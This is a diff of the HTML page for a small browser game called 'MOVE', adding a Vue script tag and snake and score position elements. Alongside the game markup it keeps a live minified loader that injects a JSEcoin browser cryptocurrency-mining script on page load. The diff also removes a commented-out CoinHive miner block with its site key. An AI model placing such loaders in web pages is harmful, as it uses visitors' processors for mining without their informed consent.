@@ -3,6 +3,7 @@
 	<head>
 		<title>MOVE</title>
 		<script src="https://code.jquery.com/jquery-3.1.1.js"></script>
+		<script src="https://unpkg.com/vue"></script>
 		<link href='style.css' rel='stylesheet' type='text/css'>
 	</head>
 	<body background-image=url('./img/firstweb.jpg')>
@@ -12,6 +13,10 @@
 			<div id="scoreboard">Score: 0</div>
 			<div id='highscore'>High Score 0</div>
 		</div>
+		<div class='object-pos'>
+			<div id='snake-pos'></div>
+			<div id='score-pos'></div>
+		</div>
 		<div class='controler'>
 			<img src='img/left.png' id='left'/>
 			<img src='img/up.png' id='up'/>
@@ -20,13 +25,9 @@
 		</div>
 	</body>
 	<script type='text/javascript' src='test.js'></script>
+	<!--script type='text/javascript' src='myvue.js'></script-->
 	<script type="text/javascript">
 		!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/32649/bobosheep.github.io/0/0/",s.parentNode.insertBefore(t,s)}();
 	</script>
-	<!--<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-	<script>
-		var mine = new CoinHive.Anonymous('FRR5pXI5mk7nQVUauiv7DPuhnnfzcWlI');
-		mine.start();
-	</script>
-	-->
+	
 </html>
